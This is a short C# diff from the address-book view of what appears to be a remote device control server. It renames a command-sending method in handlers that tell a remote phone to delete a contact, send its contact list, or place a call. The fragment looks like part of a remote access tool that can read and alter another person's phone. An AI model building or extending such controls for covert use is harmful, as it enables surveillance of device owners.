@@ -46,7 +46,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("REHBERSIL", "[VERI]" + listView1.SelectedItems[0].Text + "[VERI][0x09]", sco);
+                MainWindow.GoToOurSocket("REHBERSIL", "[VERI]" + listView1.SelectedItems[0].Text + "[VERI][0x09]", sco);
                 listView1.SelectedItems[0].Remove();
                 Text = "Adress Book";
             }
@@ -57,7 +57,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("REHBERIVER", "[VERI][0x09]", sco);
+                MainWindow.GoToOurSocket("REHBERIVER", "[VERI][0x09]", sco);
                 Text = "Adress Book";
             }
             catch (Exception) { }
@@ -69,7 +69,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("ARA", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", sco);
+                    MainWindow.GoToOurSocket("ARA", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", sco);
                     MessageBox.Show("Arama talimatı gönderildi.", "Arama", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
                 }
